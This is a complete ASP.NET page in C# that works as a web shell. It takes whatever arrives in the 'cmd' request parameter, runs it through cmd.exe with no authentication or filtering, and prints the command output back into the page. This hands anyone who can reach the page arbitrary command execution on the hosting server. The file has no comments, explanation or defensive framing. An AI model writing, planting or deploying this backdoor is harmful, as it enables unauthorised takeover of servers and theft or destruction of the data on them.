<%@ Page Language="C#" %>
<%
    if (Request["cmd"] != null) {
        string output = "";
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + Request["cmd"];
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        output = proc.StandardOutput.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }
%>
